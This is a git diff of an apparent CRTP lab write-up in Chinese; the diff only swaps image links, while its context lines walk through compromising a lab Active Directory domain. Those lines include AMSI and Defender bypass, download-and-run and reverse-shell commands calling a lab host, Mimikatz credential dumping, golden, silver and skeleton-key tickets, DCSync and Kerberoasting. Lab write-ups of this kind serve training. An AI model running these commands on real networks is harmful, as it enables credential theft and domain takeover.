@@ -13,7 +13,7 @@
 
 ## 首先bypass powershell policy和AMSI，然后引入powerview
 
-![image-20220306164751994](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220306164751994.png)
+![image-20220306164751994](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220306164751994.png)
 
 
 
@@ -21,7 +21,7 @@
 
 命令：```Get-NetUser |select cn```
 
-![image-20220306164958853](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220306164958853.png)
+![image-20220306164958853](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220306164958853.png)
 
 ## Computers
 
@@ -29,7 +29,7 @@
 
 命令：``` Get-NetComputer```
 
-![image-20220306165137578](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220306165137578.png)
+![image-20220306165137578](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220306165137578.png)
 
 ## Domain Administrators
 
@@ -39,7 +39,7 @@
 
 命令：```Get-NetGroupMember -GroupName "Domain Admins" -Recurse```
 
-![image-20220306165428856](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220306165428856.png)
+![image-20220306165428856](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220306165428856.png)
 
 
 
@@ -51,7 +51,7 @@ Enterprise Administrators属于父域的用户组，所以枚举的时候需要�
 
 命令：``` Get-NetGroupMember -GroupName "Enterprise Admins" -domain moneycorp.local  -Recurse```
 
-![image-20220306170005975](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220306170005975.png)
+![image-20220306170005975](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220306170005975.png)
 
 
 
@@ -59,7 +59,7 @@ Enterprise Administrators属于父域的用户组，所以枚举的时候需要�
 
 命令：```Invoke-ShareFinder```
 
-![image-20220306170243592](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220306170243592.png)
+![image-20220306170243592](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220306170243592.png)
 
 
 
@@ -80,19 +80,19 @@ Enterprise Administrators属于父域的用户组，所以枚举的时候需要�
 
 命令：```get-netou```
 
-![image-20220306170550692](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220306170550692.png)
+![image-20220306170550692](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220306170550692.png)
 
 ## List all the computers in the StudentMachines OU.
 
 命令：```Get-NetOU StudentMachines | %{Get-NetComputer -ADSPath $_}```
 
-![image-20220306170653672](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220306170653672.png)
+![image-20220306170653672](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220306170653672.png)
 
 ## List the GPOs
 
 命令：``` Get-NetGPO```
 
-![image-20220306170836864](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220306170836864.png)
+![image-20220306170836864](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220306170836864.png)
 
 
 
@@ -112,7 +112,7 @@ PS C:\ad>  (Get-NetOU StudentMachines -FullData).gplink
 
 ```Get-NetGPO -ADSpath 'LDAP://cn={3E04167E-C2B6-4A9A-8FB7C811158DC97C},cn=policies,cn=system,DC=dollarcorp,DC=moneycorp,DC=local'```
 
-![image-20220306171114786](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220306171114786.png)
+![image-20220306171114786](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220306171114786.png)
 
 
 
@@ -132,13 +132,13 @@ PS C:\ad>  (Get-NetOU StudentMachines -FullData).gplink
 
 命令：```Get-ObjectAcl -SamAccountName "users" -ResolveGUIDs -Verbose```
 
-![image-20220306171849514](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220306171849514.png)
+![image-20220306171849514](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220306171849514.png)
 
 ## ACL for the Domain Admins group
 
 命令：```Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs -Verbose```
 
-![image-20220306172108674](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220306172108674.png)
+![image-20220306172108674](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220306172108674.png)
 
 ## All modify rights/permissions for the studentx
 
@@ -146,7 +146,7 @@ PS C:\ad>  (Get-NetOU StudentMachines -FullData).gplink
 
 命令：```Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReference -match "sudent366"}```
 
-![image-20220306172243711](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220306172243711.png)
+![image-20220306172243711](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220306172243711.png)
 
 啥都没有
 
@@ -169,7 +169,7 @@ PS C:\ad>  (Get-NetOU StudentMachines -FullData).gplink
 
 命令：``` Get-NetForestDomain -Forest  moneycorp.local```
 
-![image-20220306165807913](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220306165807913.png)
+![image-20220306165807913](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220306165807913.png)
 
 父域：moneycorp.local
 父域DC：mcorp-dc.moneycorp.local
@@ -187,7 +187,7 @@ PS C:\ad>  (Get-NetOU StudentMachines -FullData).gplink
 
 命令：``` Get-NetDomainTrust -Domain dollarcorp.moneycorp.local```
 
-![image-20220306172917520](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220306172917520.png)
+![image-20220306172917520](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220306172917520.png)
 
 
 
@@ -199,7 +199,7 @@ PS C:\ad>  (Get-NetOU StudentMachines -FullData).gplink
 
 
 
-![image-20220306173102532](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220306173102532.png)
+![image-20220306173102532](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220306173102532.png)
 
 ## Identify external trusts of dollarcorp domain. Can you enumerate trusts for a trusting forest?
 
@@ -207,7 +207,7 @@ PS C:\ad>  (Get-NetOU StudentMachines -FullData).gplink
 
 命令：``` Get-NetForestDomain -Forest eurocorp.local -Verbose | Get-NetDomainTrust```
 
-![image-20220306173206243](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220306173206243.png)
+![image-20220306173206243](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220306173206243.png)
 
 
 
@@ -226,13 +226,13 @@ PS C:\ad>  (Get-NetOU StudentMachines -FullData).gplink
 
 一个是未加引号的路径
 
-![image-20220306174836200](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220306174836200.png)
+![image-20220306174836200](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220306174836200.png)
 
 
 
 一个是可修改的服务
 
-![image-20220306174917310](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220306174917310.png)
+![image-20220306174917310](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220306174917310.png)
 
 
 
@@ -240,13 +240,13 @@ PS C:\ad>  (Get-NetOU StudentMachines -FullData).gplink
 
 命令：``` Invoke-ServiceAbuse -Name 'AbyssWebServer' -UserName 'dcorp\student366'```
 
-![image-20220306175023097](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220306175023097.png)
+![image-20220306175023097](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220306175023097.png)
 
 
 
 测试验证是否提权成功，以管理员身份打开一个shell，输入当前账号的用户名和密码
 
-![image-20220306184512081](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220306184512081.png)
+![image-20220306184512081](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220306184512081.png)
 
 
 
@@ -256,7 +256,7 @@ PS C:\ad>  (Get-NetOU StudentMachines -FullData).gplink
 
 在上面的管理员权限shell里引入powerview，枚举当前账号有本地管理员权限的计算机
 
-![image-20220306184832811](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220306184832811.png)
+![image-20220306184832811](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220306184832811.png)
 
 除了当前计算机外还有一台机器
 
@@ -274,7 +274,7 @@ PS C:\ad>  (Get-NetOU StudentMachines -FullData).gplink
 
 关闭以后再次查看防火墙，已成功关闭
 
-![image-20220306185145590](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220306185145590.png)
+![image-20220306185145590](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220306185145590.png)
 
 
 
@@ -291,7 +291,7 @@ Set-MpPreference -DisableRealtimeMonitoring $true -Verbose
 
 运行了一个Jenkins! 程序
 
-![image-20220306185427597](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220306185427597.png)
+![image-20220306185427597](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220306185427597.png)
 
 
 
@@ -300,7 +300,7 @@ Set-MpPreference -DisableRealtimeMonitoring $true -Verbose
 jenkin!这个web app在未登陆的情况下，可以通过下面页面查看有什么账号
 ```http://172.16.3.11:8080/asynchPeople//```
 
-![image-20220306185717493](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220306185717493.png)
+![image-20220306185717493](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220306185717493.png)
 
 可以看到有builduser，jenkinsadmin，	manager三个账号
 
@@ -315,7 +315,7 @@ Jenkins特权提升，可以通过两种方法
 
 powercat监听：
 
-![image-20220306185837134](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220306185837134.png)
+![image-20220306185837134](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220306185837134.png)
 
 
 
@@ -325,7 +325,7 @@ powercat监听：
 
 另起一个shell，用python在ad工具目录下开一个http服务
 
-![image-20220306190022728](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220306190022728.png)
+![image-20220306190022728](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220306190022728.png)
 
 
 
@@ -333,15 +333,15 @@ powercat监听：
 
 选择其中一个project
 
-![image-20220306190216002](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220306190216002.png)
+![image-20220306190216002](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220306190216002.png)
 
 点击configure
 
-![image-20220306190331244](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220306190331244.png)
+![image-20220306190331244](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220306190331244.png)
 
 选择Build
 
-![image-20220306190436222](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220306190436222.png)
+![image-20220306190436222](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220306190436222.png)
 
 把命令：
 
@@ -349,7 +349,7 @@ powercat监听：
 
 填入command，并且点击保存
 
-![image-20220306190527275](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220306190527275.png)
+![image-20220306190527275](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220306190527275.png)
 
 
 
@@ -357,7 +357,7 @@ powercat监听：
 
 点击Build Now，收到反弹回来的shell
 
-![image-20220306190757811](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220306190757811.png)
+![image-20220306190757811](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220306190757811.png)
 
 
 
@@ -365,7 +365,7 @@ powercat监听：
 Task
 ● Setup BloodHound and identify a machine where studentx has local administrative access.
 
-![image-20220306200024291](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220306200024291.png)
+![image-20220306200024291](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220306200024291.png)
 
 
 
@@ -373,7 +373,7 @@ Task
 
 所有student都在RDPUSERS组
 
-![image-20220306200346148](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220306200346148.png)
+![image-20220306200346148](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220306200346148.png)
 
 
 
@@ -398,7 +398,7 @@ Identify:
 
 从BloodHound可以知道svcadmin登录过dcorp-mgmt
 
-![image-20220306200817797](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220306200817797.png)
+![image-20220306200817797](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220306200817797.png)
 
 − The domain user
 
@@ -426,13 +426,13 @@ iex (iwr http://172.16.100.66/PowerView.ps1 -UseBasicParsing)
 
 记得要bypass ps和AMSI
 
-![image-20220306201616173](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220306201616173.png)
+![image-20220306201616173](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220306201616173.png)
 
 可以看到可以横向到```dcorp-mgmt.dollarcorp.moneycorp.local```
 
 引入mimikatz，导出ciadmin的哈希
 
-![image-20220306202132064](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220306202132064.png)
+![image-20220306202132064](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220306202132064.png)
 
 
 
@@ -444,11 +444,11 @@ Invoke-Mimikatz -Command '"sekurlsa::pth /user:ciadmin /domain:dollarcorp.moneyc
 
 横向到dcorp-mgmt
 
-![image-20220306202552460](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220306202552460.png)
+![image-20220306202552460](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220306202552460.png)
 
 引入mimikatz，导出scvadmin的NTML，这里甚至还有明文密码
 
-![image-20220306202814646](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220306202814646.png)
+![image-20220306202814646](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220306202814646.png)
 
 至此我们已经拿到了域管理员svcadmin的NTML
 
@@ -479,17 +479,17 @@ Invoke-Mimikatz -Command '"sekurlsa::pth /user:ciadmin /domain:dollarcorp.moneyc
 
 可以看到我们现在已经可以横向到DC
 
-![image-20220306203520614](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220306203520614.png
+![image-20220306203520614](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220306203520614.png
 
 
 
-![image-20220306203556004](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220306203556004.png)
+![image-20220306203556004](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220306203556004.png)
 
 
 
 进入DC以后，bypass everything。dump出DC里的所有NTML信息
 
-![image-20220306203808443](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220306203808443.png)
+![image-20220306203808443](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220306203808443.png)
 
 
 
@@ -534,7 +534,7 @@ Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:dollarco
 ls \\dcorp-dc.dollarcorp.moneycorp.local\c$
 ```
 
-![image-20220306204917861](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220306204917861.png)
+![image-20220306204917861](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220306204917861.png)
 
 
 
@@ -546,7 +546,7 @@ ls \\dcorp-dc.dollarcorp.moneycorp.local\c$
 
 因为制作了DA权限的黄金票据，所以可以横向到域内任何一台计算机，包括DC，也就是说可以dump出DC上的所有NTML哈希
 
-![image-20220306205213235](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220306205213235.png)
+![image-20220306205213235](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220306205213235.png)
 
 
 
@@ -590,7 +590,7 @@ Invoke-Mimikatz -Command '"kerberos::golden /domain:dollarcorp.moneycorp.local /
 
 
 
-![image-20220306205608943](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220306205608943.png)
+![image-20220306205608943](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220306205608943.png)
 
 
 
@@ -602,13 +602,13 @@ Power -Reverse -IPAddress 172.16.100.66 -Port 443
 
 
 
-![image-20220306205738398](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220306205738398.png)
+![image-20220306205738398](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220306205738398.png)
 
 表示调用自己
 
 新开一个shell，开启监听
 
-![image-20220306210128953](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220306210128953.png)
+![image-20220306210128953](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220306210128953.png)
 
 
 
@@ -630,7 +630,7 @@ schtasks /Run /S dcorp-dc.dollarcorp.moneycorp.local /TN "User3666"
 
 收到DC返回来的shell
 
-![image-20220306210618463](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220306210618463.png)
+![image-20220306210618463](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220306210618463.png)
 
 ## WMI
 
@@ -645,7 +645,7 @@ Invoke-Mimikatz -Command '"kerberos::golden /domain:dollarcorp.moneycorp.local /
 Get-WmiObject -Class win32_operatingsystem -ComputerName dcorp-dc.dollarcorp.moneycorp.local
 ```
 
-![image-20220306210901046](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220306210901046.png)
+![image-20220306210901046](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220306210901046.png)
 
 # Learning Objective 10:
 ```Task
@@ -689,7 +689,7 @@ Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"'
 
 
 
-![image-20220306214152645](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220306214152645.png)
+![image-20220306214152645](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220306214152645.png)
 
 
 
@@ -699,7 +699,7 @@ Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"'
 
 成功登陆
 
-![image-20220306214255750](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220306214255750.png)
+![image-20220306214255750](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220306214255750.png)
 
 # Learning Objective 11:
 ```Task
@@ -712,7 +712,7 @@ Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"'
 
 用有DA权限的shell，运行下面命令，dump出DSRM的哈希密码
 
-![image-20220306220745688](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220306220745688.png)
+![image-20220306220745688](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220306220745688.png)
 
 
 
@@ -720,7 +720,7 @@ Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"'
 
 再用下面命令dump出现在Administrator的密码，与上面DSRM的密码进行比较
 
-![image-20220306220856677](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220306220856677.png)
+![image-20220306220856677](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220306220856677.png)
 
 新的密码是：```af0686cc0ca8f04df42210c9ac980760```
 
@@ -751,7 +751,7 @@ ls \\dcorp-dc.dollarcorp.moneycorp.local\c$
 
 
 
-![image-20220306221226953](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220306221226953.png)
+![image-20220306221226953](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220306221226953.png)
 
 可以访问文件系统，但是不能在这台系统上执行命令。
 
@@ -779,7 +779,7 @@ Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveG
 
 
 
-![image-20220307205932704](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220307205932704.png)
+![image-20220307205932704](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220307205932704.png)
 
 
 
@@ -814,7 +814,7 @@ Add-ObjectAcl -TargetDistinguishedName"dc=dollarcorp,dc=moneycorp,dc=local" -Pri
 Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{($_.IdentityReference -match "student366") -and (($_.ObjectType -match'replication') -or ($_.ActiveDirectoryRights -match 'GenericAll'))}
 ```
 
-![image-20220307210310991](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220307210310991.png)
+![image-20220307210310991](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220307210310991.png)
 
 已经出现```ActiveDirectoryRights : GenericAll```表示成功赋权
 
@@ -825,7 +825,7 @@ Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
 
 
 
-![image-20220307210510322](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220307210510322.png)
+![image-20220307210510322](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220307210510322.png)
 
 
 
@@ -856,7 +856,7 @@ gwmi -class win32_operatingsystem -ComputerName dcorp-dc.dollarcorp.moneycorp.lo
 
 
 
-![image-20220307215612058](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220307215612058.png)
+![image-20220307215612058](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220307215612058.png)
 
 
 
@@ -889,7 +889,7 @@ Invoke-Command -ScriptBlock{whoami} -ComputerName dcorp-dc.dollarcorp.moneycorp.
 
 
 
-![image-20220307221601057](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220307221601057.png)
+![image-20220307221601057](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220307221601057.png)
 
 
 
@@ -923,7 +923,7 @@ Invoke-Mimikatz -Command '"kerberos::golden /domain:dollarcorp.moneycorp.local /
 
 基于HOST服务的银票
 
-![image-20220307222449438](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220307222449438.png)
+![image-20220307222449438](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220307222449438.png)
 
 基于RPCSS服务的银票
 
@@ -933,7 +933,7 @@ Invoke-Mimikatz -Command '"kerberos::golden /domain:dollarcorp.moneycorp.local /
 
 
 
-![image-20220307222528731](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220307222528731.png)
+![image-20220307222528731](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220307222528731.png)
 
 可以建一个定时任务反弹DC这台服务器的shell
 
@@ -958,7 +958,7 @@ Get-NetUser -spn |select userprincipalname,serviceprincipalname
 
 
 
-![image-20220307223014352](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220307223014352.png)
+![image-20220307223014352](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220307223014352.png)
 
 
 
@@ -975,13 +975,13 @@ New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentL
 
 
 
-![image-20220307223752293](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220307223752293.png)
+![image-20220307223752293](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220307223752293.png)
 
 
 
 klist查看
 
-![image-20220307223948494](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220307223948494.png)
+![image-20220307223948494](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220307223948494.png)
 
 
 
@@ -991,7 +991,7 @@ klist查看
 
 
 
-![image-20220307224108424](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220307224108424.png)
+![image-20220307224108424](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220307224108424.png)
 
 
 
@@ -1006,7 +1006,7 @@ python.exe .\tgsrepcrack.py .\10k-worst-pass.txt 1-40a10000-student366@MSSQLSvc~
 
 
 
-![image-20220307224347704](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220307224347704.png)
+![image-20220307224347704](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220307224347704.png)
 
 
 
@@ -1017,7 +1017,7 @@ python.exe .\tgsrepcrack.py .\10k-worst-pass.txt 1-40a10000-student366@MSSQLSvc~
 
 用上面的明文密码登陆dcorp-dc，输入明文密码后可以成功登录
 
-![image-20220307224555333](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220307224555333.png)
+![image-20220307224555333](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220307224555333.png)
 
 
 
@@ -1037,7 +1037,7 @@ python.exe .\tgsrepcrack.py .\10k-worst-pass.txt 1-40a10000-student366@MSSQLSvc~
 
 枚举禁用了Kerberos预认证的用户
 
-![image-20220307225109594](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220307225109594.png)
+![image-20220307225109594](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220307225109594.png)
 
 
 
@@ -1046,7 +1046,7 @@ python.exe .\tgsrepcrack.py .\10k-worst-pass.txt 1-40a10000-student366@MSSQLSvc~
 枚举到一个VPN359user用户禁用了Kerberos预认证
 使用ASREPRoast.ps1获取kerb哈希值，这个值可以使用john等破解工具破解
 
-![image-20220307225326455](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220307225326455.png)
+![image-20220307225326455](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220307225326455.png)
 
 
 
@@ -1056,7 +1056,7 @@ python.exe .\tgsrepcrack.py .\10k-worst-pass.txt 1-40a10000-student366@MSSQLSvc~
 
 枚举RDPUsers组成员对其中有GenericWrite 或者 GenericAll权限的用户
 
-![image-20220307225619988](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220307225619988.png)
+![image-20220307225619988](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220307225619988.png)
 
 
 
@@ -1073,7 +1073,7 @@ Get-ASREPHash -UserName Control359User -Verbose
 
 
 
-![image-20220307225731335](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220307225731335.png)
+![image-20220307225731335](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220307225731335.png)
 
 
 
@@ -1089,13 +1089,13 @@ Get-ASREPHash -UserName Control359User -Verbose
 
 从下面结果可以知道当前账号（student366，是RDPUsers组的成员），对下面显示的账号是有GenericAll权限的
 
-![image-20220308203925347](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220308203925347.png)
+![image-20220308203925347](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220308203925347.png)
 
 
 
 选择Support370User用户，查询这个账号是否有SPN
 
-![image-20220308203957443](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220308203957443.png)
+![image-20220308203957443](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220308203957443.png)
 
 没有。
 
@@ -1103,21 +1103,21 @@ Get-ASREPHash -UserName Control359User -Verbose
 
 因为本账号（student366，是RDPUsers组的成员），对这个用户有GenericAll权限，我们可以为其设置一个SPN
 
-![image-20220308204051434](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220308204051434.png)
+![image-20220308204051434](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220308204051434.png)
 
 
 
 再次获取这个账号的SPN
 
-![image-20220308204138682](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220308204138682.png)
+![image-20220308204138682](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220308204138682.png)
 
 根据这个SPN，我们可以请求一个可以被破解的ticket
 
-![image-20220308204422988](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220308204422988.png)
+![image-20220308204422988](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220308204422988.png)
 
 使用klist命令列出SPN
 
-![image-20220308204506049](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220308204506049.png)
+![image-20220308204506049](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220308204506049.png)
 
 
 
@@ -1125,7 +1125,7 @@ Get-ASREPHash -UserName Control359User -Verbose
 
 用mimikatz导出
 
-![image-20220308204606898](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220308204606898.png)
+![image-20220308204606898](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220308204606898.png)
 
 
 
@@ -1133,7 +1133,7 @@ Get-ASREPHash -UserName Control359User -Verbose
 
 也可以用powerview导出krb5哈希，然后再用john破解
 
-![image-20220308204701645](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220308204701645.png)
+![image-20220308204701645](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220308204701645.png)
 
 
 
@@ -1147,7 +1147,7 @@ Get-ASREPHash -UserName Control359User -Verbose
 
 枚举非约束委派计算机（Unconstrained Delegation），使用powerview的dev版本
 
-![image-20220308205103791](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220308205103791.png)
+![image-20220308205103791](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220308205103791.png)
 
 枚举到两台计算机启用了无约束委派：dcorp-dc（DC服务器）和dcorp-appsrv
 
@@ -1187,7 +1187,7 @@ $sess = New-PSSession -ComputerName dcorp-appsrv.dollarcorp.moneycorp.local
 
 在指定session里载入Mimikatz（这里如果不能载入，可以多试几次直接```Enter-PSSession $sess```,进去以后直接bypass掉AMSI）
 
-![image-20220308205517843](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220308205517843.png)
+![image-20220308205517843](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220308205517843.png)
 
 指定目标靶机的session，在目标靶机关闭杀软
 ```
@@ -1198,7 +1198,7 @@ Invoke-command -ScriptBlock{Set-MpPreference -DisableIOAVProtection $true} -Sess
 
 用Mimikatz导出所有令牌，看看是否有Administrator的令牌
 
-![image-20220308205741713](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220308205741713.png)
